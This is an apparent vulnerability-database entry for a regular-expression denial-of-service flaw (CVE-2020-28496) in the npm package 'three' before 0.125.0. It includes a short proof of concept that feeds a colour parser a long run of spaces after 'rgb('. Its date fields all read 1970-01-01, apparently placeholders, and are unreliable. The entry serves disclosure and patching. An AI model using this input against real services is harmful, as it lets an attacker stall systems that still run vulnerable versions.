---
- id: npmjs:npm:three:1639
  title: Regular Expression Denial of Service
  description: |+
    `three` before version 0.125.0 is vulnerable to Regular Expression Denial of Service (ReDoS). This can happen when handling rgb or hsl colors.

    ## POC

    ```
    var three = require('three')

    function build_blank (n) {
     var ret = "rgb("
     for (var i = 0; i < n; i++) {
      ret += " "
     }

     return ret + "";
    }

    var Color = three.Color

    var time = Date.now();
    new Color(build_blank(50000))
    var time_cost = Date.now() - time;
    console.log(time_cost+" ms")
    ```


  affected_package: three
  vulnerable_versions:
  - "<0.125.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2020-28496
  cwe: CWE-400
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Anonymous
